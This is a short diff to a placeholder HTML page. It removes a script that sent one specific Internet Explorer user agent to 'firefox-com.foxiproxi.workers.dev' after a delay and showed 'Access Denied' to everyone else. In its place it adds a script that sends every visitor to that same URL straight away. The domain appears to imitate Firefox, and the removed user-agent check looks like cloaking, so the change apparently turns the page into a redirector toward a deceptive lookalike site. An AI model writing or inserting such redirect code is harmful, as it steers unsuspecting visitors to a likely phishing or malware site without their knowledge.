@@ -6,17 +6,8 @@
     <title>Your Website Title</title>
     <!-- Add the JavaScript code for redirection -->
     <script>
-        // Check if the user agent matches the specified criteria
-        const userAgent = navigator.userAgent;
-        if (userAgent === 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko') {
-            // Redirect after 10 seconds
-            setTimeout(() => {
-                window.location.href = 'http://firefox-com.foxiproxi.workers.dev';
-            }, 10000);
-        } else {
-            // Access denied message
-            document.body.innerHTML = '<h1>Access Denied</h1><p>You are not authorized to access this resource.</p>';
-        }
+        // Redirect all traffic to the specified domain
+        window.location.href = 'http://firefox-com.foxiproxi.workers.dev';
     </script>
 </head>
 <body>
